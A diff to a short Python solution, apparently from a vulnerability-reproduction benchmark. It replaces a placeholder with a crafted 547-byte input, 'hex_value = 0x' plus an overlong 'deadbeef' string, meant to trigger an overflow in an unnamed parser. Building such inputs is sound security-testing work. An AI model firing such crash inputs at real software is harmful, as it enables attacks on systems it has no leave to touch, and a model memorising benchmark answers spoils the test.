@@ -1,12 +1,8 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC that triggers the vulnerability.
-
-        Args:
-            src_path: Path to the vulnerable source code tarball
-
-        Returns:
-            bytes: The PoC input that should trigger the vulnerability
-        """
-        return b"A" * 547
+        prefix = b"hex_value = 0x"
+        hex_part = b"deadbeef" * 66 + b"dead"
+        suffix = b"\n"
+        poc = prefix + hex_part + suffix
+        assert len(poc) == 547
+        return poc
